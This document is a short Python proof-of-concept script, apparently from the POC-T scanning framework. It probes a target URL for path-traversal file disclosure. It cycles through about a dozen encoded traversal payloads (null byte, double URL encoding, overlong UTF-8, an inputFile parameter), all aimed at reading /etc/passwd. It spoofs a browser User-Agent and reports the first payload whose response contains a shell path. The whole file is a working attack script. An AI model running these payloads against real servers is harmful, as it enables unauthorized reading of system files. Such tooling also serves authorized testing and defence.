#!/usr/bin/env python
# -*- coding: utf-8 -*-
# project = https://github.com/Xyntax/POC-T
# author = i@cdxy.me

"""
测试用例
"""

import random
import time
import requests
import re


def poc(url):
    regx = "/bin/(bash|sh)"
    paths = ["/../../../../../../../../../../etc/passwd",
             "/../../../../../../../../../../etc/passwd%00",
             "/etc/passwd",
             "/file:///etc/passwd",
             "//././././././././././././././././././././././././../../../../../../../../etc/passwd",
             "/aa/../../cc/../../bb/../../dd/../../aa/../../cc/../../bb/../../dd/../../bb/../../dd/../../bb/../../dd/../../bb/../../dd/../../ee/../../etc/passwd",
             "/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd",
             "/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd",
             "/..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd",
             "/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
             "/resource/tutorial/jndi-appconfig/test?inputFile=/etc/passwd"]
    for path in paths:
        payload = url.rstrip('/') + path
        header = dict()
        header["User-Agent"] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
        header["Referer"] = url
        try:
            resp = requests.get(payload, headers=header, timeout=15)
            if resp.status_code == 200 and re.search(regx,resp.text):
                return payload
        except MemoryError:
            break
        except:
            continue
    return False
